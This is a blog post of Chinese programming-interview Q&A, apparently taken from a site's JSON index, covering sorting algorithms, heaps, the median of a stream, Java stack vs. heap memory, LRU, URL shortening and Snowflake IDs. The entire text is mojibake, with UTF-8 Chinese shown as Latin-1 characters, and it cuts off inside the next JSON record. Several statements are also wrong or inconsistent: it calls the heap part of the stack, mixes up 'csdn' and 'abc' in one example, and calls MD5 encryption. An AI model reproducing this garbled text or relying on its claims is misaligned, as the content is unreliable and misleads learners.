å¯¹äºèŒƒå›´æŸ¥æ‰¾æ¥è¯´ï¼Œb+æ ‘åªéœ€éå†å¶å­èŠ‚ç‚¹é“¾è¡¨å³å¯ï¼Œbæ ‘å´éœ€è¦é‡å¤åœ°ä¸­åºéå†ã€‚ éå†é“¾è¡¨æ•°ç»„æ’åºæ’åºéƒ½æœ‰å“ªå‡ ç§æ–¹æ³•ï¼Ÿè¯·åˆ—ä¸¾å‡ºæ¥ã€‚ æ’åºçš„æ–¹æ³•æœ‰ï¼šæ’å…¥æ’åºï¼ˆç›´æ¥æ’å…¥æ’åºã€å¸Œå°”æ’åºï¼‰ï¼Œäº¤æ¢æ’åºï¼ˆå†’æ³¡æ’åºã€å¿«é€Ÿæ’åºï¼‰ï¼Œé€‰æ‹©æ’åºï¼ˆç›´æ¥é€‰æ‹©æ’åºã€å †æ’åºï¼‰ï¼Œå½’å¹¶æ’åºï¼Œåˆ†é…æ’åºï¼ˆç®±æ’åºã€åŸºæ•°æ’åºï¼‰å¿«é€Ÿæ’åºçš„ä¼ªä»£ç ã€‚/ /ä½¿ç”¨å¿«é€Ÿæ’åºæ–¹æ³•å¯¹a[ 0 :n- 1 ]æ’åºä»a[ 0 :n- 1 ]ä¸­é€‰æ‹©ä¸€ä¸ªå…ƒç´ ä½œä¸ºm i d d l eï¼Œè¯¥å…ƒç´ ä¸ºæ”¯ç‚¹æŠŠä½™ä¸‹çš„å…ƒç´ åˆ†å‰²ä¸ºä¸¤æ®µleft å’Œr i g h tï¼Œä½¿å¾—l e f tä¸­çš„å…ƒç´ éƒ½å°äºç­‰äºæ”¯ç‚¹ï¼Œè€Œright ä¸­çš„å…ƒç´ éƒ½å¤§äºç­‰äºæ”¯ç‚¹é€’å½’åœ°ä½¿ç”¨å¿«é€Ÿæ’åºæ–¹æ³•å¯¹left è¿›è¡Œæ’åºé€’å½’åœ°ä½¿ç”¨å¿«é€Ÿæ’åºæ–¹æ³•å¯¹right è¿›è¡Œæ’åºæ‰€å¾—ç»“æœä¸ºl e f t + m i d d l e + r i g h t å½’å¹¶æ’åºçš„åŸç†æ˜¯ä»€ä¹ˆï¼Ÿï¼ˆ1ï¼‰å½’å¹¶æ’åºæ˜¯å»ºç«‹åœ¨å½’å¹¶æ“ä½œä¸Šçš„ä¸€ç§æœ‰æ•ˆçš„æ’åºç®—æ³•ã€‚è¯¥ç®—æ³•æ˜¯é‡‡ç”¨åˆ†æ²»æ³•ï¼ˆDivide and Conquerï¼‰çš„ä¸€ä¸ªéå¸¸å…¸å‹çš„åº”ç”¨ã€‚ ï¼ˆ2ï¼‰é¦–å…ˆè€ƒè™‘ä¸‹å¦‚ä½•å°†å°†äºŒä¸ªæœ‰åºæ•°åˆ—åˆå¹¶ã€‚è¿™ä¸ªéå¸¸ç®€å•ï¼Œåªè¦ä»æ¯”è¾ƒäºŒä¸ªæ•°åˆ—çš„ç¬¬ä¸€ä¸ªæ•°ï¼Œè°å°å°±å…ˆå–è°ï¼Œå–äº†åå°±åœ¨å¯¹åº”æ•°åˆ—ä¸­åˆ é™¤è¿™ä¸ªæ•°ã€‚ç„¶åå†è¿›è¡Œæ¯”è¾ƒï¼Œå¦‚æœæœ‰æ•°åˆ—ä¸ºç©ºï¼Œé‚£ç›´æ¥å°†å¦ä¸€ä¸ªæ•°åˆ—çš„æ•°æ®ä¾æ¬¡å–å‡ºå³å¯ã€‚ ï¼ˆ3ï¼‰è§£å†³äº†ä¸Šé¢çš„åˆå¹¶æœ‰åºæ•°åˆ—é—®é¢˜ï¼Œå†æ¥çœ‹å½’å¹¶æ’åºï¼Œå…¶çš„åŸºæœ¬æ€è·¯å°±æ˜¯å°†æ•°ç»„åˆ†æˆäºŒç»„Aï¼ŒBï¼Œå¦‚æœè¿™äºŒç»„ç»„å†…çš„æ•°æ®éƒ½æ˜¯æœ‰åºçš„ï¼Œé‚£ä¹ˆå°±å¯ä»¥å¾ˆæ–¹ä¾¿çš„å°†è¿™äºŒç»„æ•°æ®è¿›è¡Œæ’åºã€‚å¦‚ä½•è®©è¿™äºŒç»„ç»„å†…æ•°æ®æœ‰åºäº†ï¼Ÿ å¯ä»¥å°†Aï¼ŒBç»„å„è‡ªå†åˆ†æˆäºŒç»„ã€‚ä¾æ¬¡ç±»æ¨ï¼Œå½“åˆ†å‡ºæ¥çš„å°ç»„åªæœ‰ä¸€ä¸ªæ•°æ®æ—¶ï¼Œå¯ä»¥è®¤ä¸ºè¿™ä¸ªå°ç»„ç»„å†…å·²ç»è¾¾åˆ°äº†æœ‰åºï¼Œç„¶åå†åˆå¹¶ç›¸é‚»çš„äºŒä¸ªå°ç»„å°±å¯ä»¥äº†ã€‚è¿™æ ·é€šè¿‡å…ˆé€’å½’çš„åˆ†è§£æ•°åˆ—ï¼Œå†åˆå¹¶æ•°åˆ—å°±å®Œæˆäº†å½’å¹¶æ’åºã€‚ å †æ’åºçš„åŸç†æ˜¯ä»€ä¹ˆï¼Ÿå †æ’åºå°±æ˜¯æŠŠæœ€å¤§å †å †é¡¶çš„æœ€å¤§æ•°å–å‡ºï¼Œå°†å‰©ä½™çš„å †ç»§ç»­è°ƒæ•´ä¸ºæœ€å¤§å †ï¼Œå†æ¬¡å°†å †é¡¶çš„æœ€å¤§æ•°å–å‡ºï¼Œè¿™ä¸ªè¿‡ç¨‹æŒç»­åˆ°å‰©ä½™æ•°åªæœ‰ä¸€ä¸ªæ—¶ç»“æŸã€‚åœ¨å †ä¸­å®šä¹‰ä»¥ä¸‹å‡ ç§æ“ä½œï¼š ï¼ˆ1ï¼‰æœ€å¤§å †è°ƒæ•´ï¼ˆMax-Heapifyï¼‰ï¼šå°†å †çš„æœ«ç«¯å­èŠ‚ç‚¹ä½œè°ƒæ•´ï¼Œä½¿å¾—å­èŠ‚ç‚¹æ°¸è¿œå°äºçˆ¶èŠ‚ç‚¹ã€‚ ï¼ˆ2ï¼‰åˆ›å»ºæœ€å¤§å †ï¼ˆBuild-Max-Heapï¼‰ï¼šå°†å †æ‰€æœ‰æ•°æ®é‡æ–°æ’åºï¼Œä½¿å…¶æˆä¸ºæœ€å¤§å †ã€‚ ï¼ˆ3ï¼‰å †æ’åºï¼ˆHeap-Sortï¼‰ï¼šç§»é™¤ä½åœ¨ç¬¬ä¸€ä¸ªæ•°æ®çš„æ ¹èŠ‚ç‚¹ï¼Œå¹¶åšæœ€å¤§å †è°ƒæ•´çš„é€’å½’è¿ç®— å¦‚ä½•å¾—åˆ°ä¸€ä¸ªæ•°æ®æµä¸­çš„ä¸­ä½æ•°ï¼Ÿæ•°æ®æ˜¯ä»ä¸€ä¸ªæ•°æ®æµä¸­è¯»å‡ºæ¥çš„ï¼Œæ•°æ®çš„æ•°ç›®éšç€æ—¶é—´çš„å˜åŒ–è€Œå¢åŠ ã€‚å¦‚æœç”¨ä¸€ä¸ªæ•°æ®å®¹å™¨æ¥ä¿å­˜ä»æµä¸­è¯»å‡ºæ¥çš„æ•°æ®ï¼Œå½“æœ‰æ–°çš„æ•°æ®æµä¸­è¯»å‡ºæ¥æ—¶ï¼Œè¿™äº›æ•°æ®å°±æ’å…¥åˆ°æ•°æ®å®¹å™¨ä¸­ã€‚ æ•°ç»„æ˜¯æœ€ç®€å•çš„å®¹å™¨ã€‚å¦‚æœæ•°ç»„æ²¡æœ‰æ’åºï¼Œå¯ä»¥ç”¨ Partition å‡½æ•°æ‰¾å‡ºæ•°ç»„ä¸­çš„ä¸­ä½æ•°ã€‚åœ¨æ²¡æœ‰æ’åºçš„æ•°ç»„ä¸­æ’å…¥ä¸€ä¸ªæ•°å­—å’Œæ‰¾å‡ºä¸­ä½æ•°çš„æ—¶é—´å¤æ‚åº¦æ˜¯ O(1)å’Œ O(n)ã€‚ æˆ‘ä»¬è¿˜å¯ä»¥å¾€æ•°ç»„é‡Œæ’å…¥æ–°æ•°æ®æ—¶è®©æ•°ç»„ä¿æŒæ’åºï¼Œè¿™æ˜¯ç”±äºå¯èƒ½è¦ç§»åŠ¨ O(n)ä¸ªæ•°ï¼Œå› æ­¤éœ€è¦ O(n)æ—¶é—´æ‰èƒ½å®Œæˆæ’å…¥æ“ä½œã€‚åœ¨å·²ç»æ’å¥½åºçš„æ•°ç»„ä¸­æ‰¾å‡ºä¸­ä½æ•°æ˜¯ä¸€ä¸ªç®€å•çš„æ“ä½œï¼Œåªéœ€è¦ O(1)æ—¶é—´å³å¯å®Œæˆã€‚ æ’åºçš„é“¾è¡¨æ—¶å¦å¤–ä¸€ä¸ªé€‰æ‹©ã€‚æˆ‘ä»¬éœ€è¦ O(n)æ—¶é—´æ‰èƒ½åœ¨é“¾è¡¨ä¸­æ‰¾åˆ°åˆé€‚çš„ä½ç½®æ’å…¥æ–°çš„æ•°æ®ã€‚å¦‚æœå®šä¹‰ä¸¤ä¸ªæŒ‡é’ˆæŒ‡å‘é“¾è¡¨çš„ä¸­é—´ç»“ç‚¹ï¼ˆå¦‚æœé“¾è¡¨çš„ç»“ç‚¹æ•°ç›®æ˜¯å¥‡æ•°ï¼Œé‚£ä¹ˆè¿™ä¸¤ä¸ªæŒ‡é’ˆæŒ‡å‘åŒä¸€ä¸ªç»“ç‚¹ï¼‰ï¼Œé‚£ä¹ˆå¯ä»¥åœ¨ Oï¼ˆ1ï¼‰æ—¶é—´å¾—å‡ºä¸­ä½æ•°ã€‚æ­¤æ—¶æ—¶é—´æ•ˆç‡ä¸åŠåŸºäºæ’åºçš„æ•°ç»„çš„æ—¶é—´æ•ˆç‡ä¸€æ ·ã€‚ å¦‚æœèƒ½å¤Ÿä¿è¯æ•°æ®å®¹å™¨å·¦è¾¹çš„æ•°æ®éƒ½å°äºå³è¾¹çš„æ•°æ®ï¼Œè¿™æ ·å³ä½¿å·¦ã€å³ä¸¤è¾¹å†…éƒ¨çš„æ•°æ®æ²¡æœ‰æ’åºï¼Œä¹Ÿå¯ä»¥æ ¹æ®å·¦è¾¹æœ€å¤§çš„æ•°åŠå³è¾¹æœ€å°çš„æ•°å¾—åˆ°ä¸­ä½æ•°ã€‚å¦‚ä½•å¿«é€Ÿä»ä¸€ä¸ªå®¹å™¨ä¸­æ‰¾å‡ºæœ€å¤§æ•°ï¼Ÿç”¨æœ€å¤§å †å®ç°è¿™ä¸ªæ•°æ®å®¹å™¨ï¼Œå› ä¸ºä½äºå †é¡¶çš„å°±æ˜¯æœ€å¤§çš„æ•°æ®ã€‚åŒæ ·ï¼Œä¹Ÿå¯ä»¥å¿«é€Ÿä»æœ€å°å †ä¸­æ‰¾å‡ºæœ€å°æ•°ã€‚ å› æ­¤å¯ä»¥ç”¨å¦‚ä¸‹æ€è·¯æ¥è§£å†³è¿™ä¸ªé—®é¢˜ï¼šç”¨ä¸€ä¸ªæœ€å¤§å †å®ç°å·¦è¾¹çš„æ•°æ®å®¹å™¨ï¼Œç”¨æœ€å°å †å®ç°å³è¾¹çš„æ•°æ®å®¹å™¨ã€‚å¾€å †ä¸­æ’å…¥ä¸€ä¸ªæ•°æ®çš„æ—¶é—´æ•ˆç‡æ˜¯ O(logn)ã€‚ç”±äºåªéœ€ O(1)æ—¶é—´å°±å¯ä»¥å¾—åˆ°ä½äºå †é¡¶çš„æ•°æ®ï¼Œå› æ­¤å¾—åˆ°ä¸­ä½æ•°çš„æ—¶é—´æ•ˆç‡æ˜¯ O(1)ã€‚ ä½ çŸ¥é“å“ªäº›æ’åºç®—æ³•ï¼Œè¿™äº›ç®—æ³•çš„æ—¶é—´å¤æ‚åº¦åˆ†åˆ«æ˜¯å¤šå°‘ï¼Œè§£é‡Šä¸€ä¸‹å¿«æ’ï¼Ÿ å¿«æ’ï¼šå¿«é€Ÿæ’åºæœ‰ä¸¤ä¸ªæ–¹å‘ï¼Œå·¦è¾¹çš„iä¸‹æ ‡ä¸€ç›´å¾€å³èµ°ï¼ˆå½“æ¡ä»¶a[i] &lt;= a[center_index]æ—¶ï¼‰ï¼Œå…¶ä¸­center_indexæ˜¯ä¸­æ¢å…ƒç´ çš„æ•°ç»„ä¸‹æ ‡ï¼Œä¸€èˆ¬å–ä¸ºæ•°ç»„ç¬¬0ä¸ªå…ƒç´ ã€‚ è€Œå³è¾¹çš„jä¸‹æ ‡ä¸€ç›´å¾€å·¦èµ°ï¼ˆå½“a[j] &gt; a[center_index]æ—¶ï¼‰ã€‚ å¦‚æœiå’Œjéƒ½èµ°ä¸åŠ¨äº†ï¼Œi &lt;= j, äº¤æ¢a[i]å’Œa[j],é‡å¤ä¸Šé¢çš„è¿‡ç¨‹ï¼Œç›´åˆ°i&gt;jã€‚äº¤æ¢a[j]å’Œa[center_index]ï¼Œå®Œæˆä¸€è¶Ÿå¿«é€Ÿæ’åºã€‚ å †ä¸æ ˆè§£é‡Šä¸€ä¸‹ï¼Œå†…å­˜ä¸­çš„æ ˆ(stack)ã€å †(heap) å’Œé™æ€åŒº(static area) çš„ç”¨æ³•ã€‚é€šå¸¸æˆ‘ä»¬å®šä¹‰ä¸€ä¸ªåŸºæœ¬æ•°æ®ç±»å‹çš„å˜é‡ï¼Œä¸€ä¸ªå¯¹è±¡çš„å¼•ç”¨ï¼Œè¿˜æœ‰å°±æ˜¯å‡½æ•°è°ƒç”¨çš„ç°åœºä¿å­˜éƒ½ä½¿ç”¨å†…å­˜ä¸­çš„æ ˆç©ºé—´ï¼›è€Œé€šè¿‡newå…³é”®å­—å’Œæ„é€ å™¨åˆ›å»ºçš„å¯¹è±¡æ”¾åœ¨å †ç©ºé—´ï¼›ç¨‹åºä¸­çš„å­—é¢é‡ï¼ˆliteralï¼‰å¦‚ç›´æ¥ä¹¦å†™çš„100ã€â€helloâ€å’Œå¸¸é‡éƒ½æ˜¯æ”¾åœ¨é™æ€åŒºä¸­ã€‚æ ˆç©ºé—´æ“ä½œèµ·æ¥æœ€å¿«ä½†æ˜¯æ ˆå¾ˆå°ï¼Œé€šå¸¸å¤§é‡çš„å¯¹è±¡éƒ½æ˜¯æ”¾åœ¨å †ç©ºé—´ï¼Œç†è®ºä¸Šæ•´ä¸ªå†…å­˜æ²¡æœ‰è¢«å…¶ä»–è¿›ç¨‹ä½¿ç”¨çš„ç©ºé—´ç”šè‡³ç¡¬ç›˜ä¸Šçš„è™šæ‹Ÿå†…å­˜éƒ½å¯ä»¥è¢«å½“æˆå †ç©ºé—´æ¥ä½¿ç”¨ã€‚String str = new String(â€œhelloâ€);ä¸Šé¢çš„è¯­å¥ä¸­å˜é‡stræ”¾åœ¨æ ˆä¸Šï¼Œç”¨newåˆ›å»ºå‡ºæ¥çš„å­—ç¬¦ä¸²å¯¹è±¡æ”¾åœ¨å †ä¸Šï¼Œè€Œâ€helloâ€è¿™ä¸ªå­—é¢é‡æ”¾åœ¨é™æ€åŒºã€‚ heapå’Œstackæœ‰ä»€ä¹ˆåŒºåˆ«ã€‚æ ˆæ˜¯ä¸€ç§çº¿å½¢é›†åˆï¼Œå…¶æ·»åŠ å’Œåˆ é™¤å…ƒç´ çš„æ“ä½œåº”åœ¨åŒä¸€æ®µå®Œæˆã€‚æ ˆæŒ‰ç…§åè¿›å…ˆå‡ºçš„æ–¹å¼è¿›è¡Œå¤„ç†ã€‚å †æ˜¯æ ˆçš„ä¸€ä¸ªç»„æˆå…ƒç´ ã€‚ å †ä¸æ ˆçš„ä¸åŒæ˜¯ä»€ä¹ˆï¼Ÿï¼ˆ1ï¼‰Javaçš„å †æ˜¯ä¸€ä¸ªè¿è¡Œæ—¶æ•°æ®åŒºï¼Œç±»çš„å¯¹è±¡ä»ä¸­åˆ†é…ç©ºé—´ã€‚é€šè¿‡æ¯”å¦‚ï¼šnewç­‰æŒ‡ä»¤å»ºç«‹ï¼Œä¸éœ€è¦ä»£ç æ˜¾å¼çš„é‡Šæ”¾ï¼Œç”±åƒåœ¾å›æ”¶æ¥è´Ÿè´£ã€‚ ä¼˜ç‚¹ï¼šå¯ä»¥åŠ¨æ€åœ°åˆ†é…å†…å­˜å¤§å°ï¼Œåƒåœ¾æ”¶é›†å™¨ä¼šè‡ªåŠ¨å›æ”¶åƒåœ¾æ•°æ®ã€‚ ç¼ºç‚¹ï¼šç”±äºå…¶ä¼˜ç‚¹ï¼Œæ‰€ä»¥å­˜å–é€Ÿåº¦è¾ƒæ…¢ã€‚ ï¼ˆ2ï¼‰æ ˆï¼š å…¶æ•°æ®é¡¹çš„æ’å…¥å’Œåˆ é™¤éƒ½åªèƒ½åœ¨ç§°ä¸ºæ ˆé¡¶çš„ä¸€ç«¯å®Œæˆï¼Œåè¿›å…ˆå‡ºã€‚æ ˆä¸­å­˜æ”¾ä¸€äº›åŸºæœ¬ç±»å‹çš„ å˜é‡ å’Œ å¯¹è±¡å¥æŸ„ã€‚ ä¼˜ç‚¹ï¼šè¯»å–æ•°åº¦æ¯”å †è¦å¿«ï¼Œä»…æ¬¡äºå¯„å­˜å™¨ï¼Œæ ˆæ•°æ®å¯ä»¥å…±äº«ã€‚ ç¼ºç‚¹ï¼šæ¯”å †ç¼ºä¹çµæ´»æ€§ï¼Œå­˜åœ¨æ ˆä¸­çš„æ•°æ®å¤§å°ä¸ç”Ÿå­˜æœŸå¿…é¡»æ˜¯ç¡®å®šçš„ã€‚ ä¸¾ä¾‹ï¼š Stringæ˜¯ä¸€ä¸ªç‰¹æ®Šçš„åŒ…è£…ç±»æ•°æ®ã€‚å¯ä»¥ç”¨ï¼šString str = new String(â€œcsdnâ€);String str = â€œcsdnâ€; ä¸¤ç§çš„å½¢å¼æ¥åˆ›å»ºï¼Œç¬¬ä¸€ç§æ˜¯ç”¨new()æ¥æ–°å»ºå¯¹è±¡çš„ï¼Œå®ƒä¼šåœ¨å­˜æ”¾äºå †ä¸­ã€‚æ¯è°ƒç”¨ä¸€æ¬¡å°±ä¼šåˆ›å»ºä¸€ä¸ªæ–°çš„å¯¹è±¡ã€‚è€Œç¬¬äºŒç§æ˜¯å…ˆåœ¨æ ˆä¸­åˆ›å»ºä¸€ä¸ªå¯¹Stringç±»çš„å¯¹è±¡å¼•ç”¨å˜é‡strï¼Œç„¶åæŸ¥æ‰¾æ ˆä¸­æœ‰æ²¡æœ‰å­˜æ”¾â€csdnâ€ï¼Œå¦‚æœæ²¡æœ‰ï¼Œåˆ™å°†â€csdnâ€å­˜æ”¾è¿›æ ˆï¼Œå¹¶ä»¤stræŒ‡å‘â€abcâ€ï¼Œå¦‚æœå·²ç»æœ‰â€csdnâ€ åˆ™ç›´æ¥ä»¤stræŒ‡å‘â€œcsdnâ€ã€‚ é˜Ÿåˆ—ä»€ä¹ˆæ˜¯Javaä¼˜å…ˆçº§é˜Ÿåˆ—(Priority Queue)ï¼ŸPriorityQueueæ˜¯ä¸€ä¸ªåŸºäºä¼˜å…ˆçº§å †çš„æ— ç•Œé˜Ÿåˆ—ï¼Œå®ƒçš„å…ƒç´ æ˜¯æŒ‰ç…§è‡ªç„¶é¡ºåº(natural order)æ’åºçš„ã€‚åœ¨åˆ›å»ºçš„æ—¶å€™ï¼Œæˆ‘ä»¬å¯ä»¥ç»™å®ƒæä¾›ä¸€ä¸ªè´Ÿè´£ç»™å…ƒç´ æ’åºçš„æ¯”è¾ƒå™¨ã€‚PriorityQueueä¸å…è®¸nullå€¼ï¼Œå› ä¸ºä»–ä»¬æ²¡æœ‰è‡ªç„¶é¡ºåºï¼Œæˆ–è€…è¯´ä»–ä»¬æ²¡æœ‰ä»»ä½•çš„ç›¸å…³è”çš„æ¯”è¾ƒå™¨ã€‚æœ€åï¼ŒPriorityQueueä¸æ˜¯çº¿ç¨‹å®‰å…¨çš„ï¼Œå…¥é˜Ÿå’Œå‡ºé˜Ÿçš„æ—¶é—´å¤æ‚åº¦æ˜¯O(log(n))ã€‚ é«˜çº§ç®—æ³•LRUç®—æ³•çš„å®ç°åŸç†ï¼Ÿâ‘ LRUï¼ˆLeast recently usedï¼Œæœ€è¿‘æœ€å°‘ä½¿ç”¨ï¼‰ç®—æ³•æ ¹æ®æ•°æ®çš„å†å²è®¿é—®è®°å½•æ¥è¿›è¡Œæ·˜æ±°æ•°æ®ï¼Œå…¶æ ¸å¿ƒæ€æƒ³æ˜¯â€œå¦‚æœæ•°æ®æœ€è¿‘è¢«è®¿é—®è¿‡ï¼Œé‚£ä¹ˆå°†æ¥è¢«è®¿é—®çš„å‡ ç‡ä¹Ÿå¾ˆé«˜â€ï¼Œåè¿‡æ¥è¯´â€œå¦‚æœæ•°æ®æœ€è¿‘è¿™æ®µæ—¶é—´ä¸€ç›´éƒ½æ²¡æœ‰è®¿é—®,é‚£ä¹ˆå°†æ¥è¢«è®¿é—®çš„æ¦‚ç‡ä¹Ÿä¼šå¾ˆä½â€ï¼Œä¸¤ç§ç†è§£æ˜¯ä¸€æ ·çš„ï¼›å¸¸ç”¨äºé¡µé¢ç½®æ¢ç®—æ³•ï¼Œä¸ºè™šæ‹Ÿé¡µå¼å­˜å‚¨ç®¡ç†æœåŠ¡ã€‚ â‘¡è¾¾åˆ°è¿™æ ·ä¸€ç§æƒ…å½¢çš„ç®—æ³•æ˜¯æœ€ç†æƒ³çš„ï¼šæ¯æ¬¡è°ƒæ¢å‡ºçš„é¡µé¢æ˜¯æ‰€æœ‰å†…å­˜é¡µé¢ä¸­æœ€è¿Ÿå°†è¢«ä½¿ç”¨çš„ï¼›è¿™å¯ä»¥æœ€å¤§é™åº¦çš„æ¨è¿Ÿé¡µé¢è°ƒæ¢ï¼Œè¿™ç§ç®—æ³•ï¼Œè¢«ç§°ä¸ºç†æƒ³é¡µé¢ç½®æ¢ç®—æ³•ã€‚å¯æƒœçš„æ˜¯ï¼Œè¿™ç§ç®—æ³•æ˜¯æ— æ³•å®ç°çš„ã€‚ä¸ºäº†å°½é‡å‡å°‘ä¸ç†æƒ³ç®—æ³•çš„å·®è·ï¼Œäº§ç”Ÿäº†å„ç§ç²¾å¦™çš„ç®—æ³•ï¼Œæœ€è¿‘æœ€å°‘ä½¿ç”¨é¡µé¢ç½®æ¢ç®—æ³•ä¾¿æ˜¯å…¶ä¸­ä¸€ä¸ªã€‚LRU ç®—æ³•çš„æå‡ºï¼Œæ˜¯åŸºäºè¿™æ ·ä¸€ä¸ªäº‹å®ï¼šåœ¨å‰é¢å‡ æ¡æŒ‡ä»¤ä¸­ä½¿ç”¨é¢‘ç¹çš„é¡µé¢å¾ˆå¯èƒ½åœ¨åé¢çš„å‡ æ¡æŒ‡ä»¤ä¸­é¢‘ç¹ä½¿ç”¨ã€‚åè¿‡æ¥è¯´ï¼Œå·²ç»å¾ˆä¹…æ²¡æœ‰ä½¿ç”¨çš„é¡µé¢å¾ˆå¯èƒ½åœ¨æœªæ¥è¾ƒé•¿çš„ä¸€æ®µæ—¶é—´å†…ä¸ä¼šè¢«ç”¨åˆ° ã€‚è¿™ä¸ªï¼Œå°±æ˜¯è‘—åçš„å±€éƒ¨æ€§åŸç†â€”â€”æ¯”å†…å­˜é€Ÿåº¦è¿˜è¦å¿«çš„cacheï¼Œä¹Ÿæ˜¯åŸºäºåŒæ ·çš„åŸç†è¿è¡Œçš„ã€‚å› æ­¤ï¼Œæˆ‘ä»¬åªéœ€è¦åœ¨æ¯æ¬¡è°ƒæ¢æ—¶ï¼Œæ‰¾åˆ°æœ€è¿‘æœ€å°‘ä½¿ç”¨çš„é‚£ä¸ªé¡µé¢è°ƒå‡ºå†…å­˜ã€‚ ç®—æ³•å®ç°çš„å…³é”® å‘½ä¸­ç‡ï¼šå½“å­˜åœ¨çƒ­ç‚¹æ•°æ®æ—¶ï¼ŒLRUçš„æ•ˆç‡å¾ˆå¥½ï¼Œä½†å¶å‘æ€§çš„ã€å‘¨æœŸæ€§çš„æ‰¹é‡æ“ä½œä¼šå¯¼è‡´ LRU å‘½ä¸­ç‡æ€¥å‰§ä¸‹é™ï¼Œç¼“å­˜æ±¡æŸ“æƒ…å†µæ¯”è¾ƒä¸¥é‡ã€‚å¤æ‚åº¦ï¼šå®ç°èµ·æ¥è¾ƒä¸ºç®€å•ã€‚å­˜å‚¨æˆæœ¬ï¼šå‡ ä¹æ²¡æœ‰ç©ºé—´ä¸Šæµªè´¹ã€‚ä»£ä»·ï¼šå‘½ä¸­æ—¶éœ€è¦éå†é“¾è¡¨ï¼Œæ‰¾åˆ°å‘½ä¸­çš„æ•°æ®å—ç´¢å¼•ï¼Œç„¶åéœ€è¦å°†æ•°æ®ç§»åˆ°å¤´éƒ¨ã€‚ ä¸ºä»€ä¹ˆè¦è®¾è®¡ åç¼€è¡¨è¾¾å¼ï¼Œæœ‰ä»€ä¹ˆå¥½å¤„ï¼Ÿåç¼€è¡¨è¾¾å¼åˆå«é€†æ³¢å…°è¡¨è¾¾å¼ï¼Œé€†æ³¢å…°è®°æ³•ä¸éœ€è¦æ‹¬å·æ¥æ ‡è¯†æ“ä½œç¬¦çš„ä¼˜å…ˆçº§ã€‚ è®¾è®¡ä¸€ä¸ªç®—æ³•ï¼Œç”¨æ¥å‹ç¼©ä¸€æ®µURLï¼Ÿè¯¥ç®—æ³•ä¸»è¦ä½¿ç”¨MD5 ç®—æ³•å¯¹åŸå§‹é“¾æ¥è¿›è¡ŒåŠ å¯†ï¼ˆè¿™é‡Œä½¿ç”¨çš„MD5 åŠ å¯†åçš„å­—ç¬¦ä¸²é•¿åº¦ä¸º32 ä½ï¼‰ï¼Œç„¶åå¯¹åŠ å¯†åçš„å­—ç¬¦ä¸²è¿›è¡Œå¤„ç†ä»¥å¾—åˆ°çŸ­é“¾æ¥çš„åœ°å€ã€‚ è°ˆä¸€è°ˆï¼Œidå…¨å±€å”¯ä¸€ä¸”è‡ªå¢ï¼Œå¦‚ä½•å®ç°ï¼ŸSnowFlakeé›ªèŠ±ç®—æ³• é›ªèŠ±IDç”Ÿæˆçš„æ˜¯ä¸€ä¸ª64ä½çš„äºŒè¿›åˆ¶æ­£æ•´æ•°ï¼Œç„¶åè½¬æ¢æˆ10è¿›åˆ¶çš„æ•°ã€‚64ä½äºŒè¿›åˆ¶æ•°ç”±å¦‚ä¸‹éƒ¨åˆ†ç»„æˆï¼š snowflake idç”Ÿæˆè§„åˆ™ 1ä½æ ‡è¯†ç¬¦ï¼šå§‹ç»ˆæ˜¯0ï¼Œç”±äºlongåŸºæœ¬ç±»å‹åœ¨Javaä¸­æ˜¯å¸¦ç¬¦å·çš„ï¼Œæœ€é«˜ä½æ˜¯ç¬¦å·ä½ï¼Œæ­£æ•°æ˜¯0ï¼Œè´Ÿæ•°æ˜¯1ï¼Œæ‰€ä»¥idä¸€èˆ¬æ˜¯æ­£æ•°ï¼Œæœ€é«˜ä½æ˜¯0ã€‚ 41ä½æ—¶é—´æˆ³ï¼š41ä½æ—¶é—´æˆªä¸æ˜¯å­˜å‚¨å½“å‰æ—¶é—´çš„æ—¶é—´æˆªï¼Œè€Œæ˜¯å­˜å‚¨æ—¶é—´æˆªçš„å·®å€¼ï¼ˆå½“å‰æ—¶é—´æˆª - å¼€å§‹æ—¶é—´æˆª )å¾—åˆ°çš„å€¼ï¼Œè¿™é‡Œçš„çš„å¼€å§‹æ—¶é—´æˆªï¼Œä¸€èˆ¬æ˜¯æˆ‘ä»¬çš„idç”Ÿæˆå™¨å¼€å§‹ä½¿ç”¨çš„æ—¶é—´ï¼Œç”±æˆ‘ä»¬ç¨‹åºæ¥æŒ‡å®šçš„ã€‚ 10ä½æœºå™¨æ ‡è¯†ç ï¼šå¯ä»¥éƒ¨ç½²åœ¨1024ä¸ªèŠ‚ç‚¹ï¼Œå¦‚æœæœºå™¨åˆ†æœºæˆ¿ï¼ˆIDCï¼‰éƒ¨ç½²ï¼Œè¿™10ä½å¯ä»¥ç”± 5ä½æœºæˆ¿ID + 5ä½æœºå™¨ID ç»„æˆã€‚ 12ä½åºåˆ—ï¼šæ¯«ç§’å†…çš„è®¡æ•°ï¼Œ12ä½çš„è®¡æ•°é¡ºåºå·æ”¯æŒæ¯ä¸ªèŠ‚ç‚¹æ¯æ¯«ç§’(åŒä¸€æœºå™¨ï¼ŒåŒä¸€æ—¶é—´æˆª)äº§ç”Ÿ4096ä¸ªIDåºå· ä¼˜ç‚¹ ç®€å•é«˜æ•ˆï¼Œç”Ÿæˆé€Ÿåº¦å¿«ã€‚ æ—¶é—´æˆ³åœ¨é«˜ä½ï¼Œè‡ªå¢åºåˆ—åœ¨ä½ä½ï¼Œæ•´ä¸ªIDæ˜¯è¶‹åŠ¿é€’å¢çš„ï¼ŒæŒ‰ç…§æ—¶é—´æœ‰åºé€’å¢ã€‚ çµæ´»åº¦é«˜ï¼Œå¯ä»¥æ ¹æ®ä¸šåŠ¡éœ€æ±‚ï¼Œè°ƒæ•´bitä½çš„åˆ’åˆ†ï¼Œæ»¡è¶³ä¸åŒçš„éœ€æ±‚ã€‚ ç¼ºç‚¹ ä¾èµ–æœºå™¨çš„æ—¶é’Ÿï¼Œå¦‚æœæœåŠ¡å™¨æ—¶é’Ÿå›æ‹¨ï¼Œä¼šå¯¼è‡´é‡å¤IDç”Ÿæˆã€‚ åœ¨åˆ†å¸ƒå¼ç¯å¢ƒä¸Šï¼Œæ¯ä¸ªæœåŠ¡å™¨çš„æ—¶é’Ÿä¸å¯èƒ½å®Œå…¨åŒæ­¥ï¼Œæœ‰æ—¶ä¼šå‡ºç°ä¸æ˜¯å…¨å±€é€’å¢çš„æƒ…å†µã€‚","categories":[],"tags":[{"name":"Interview","slug":"Interview","permalink":"https://blog.kayleh.top/tags/Interview/"}]},{"title":"introduction to operating 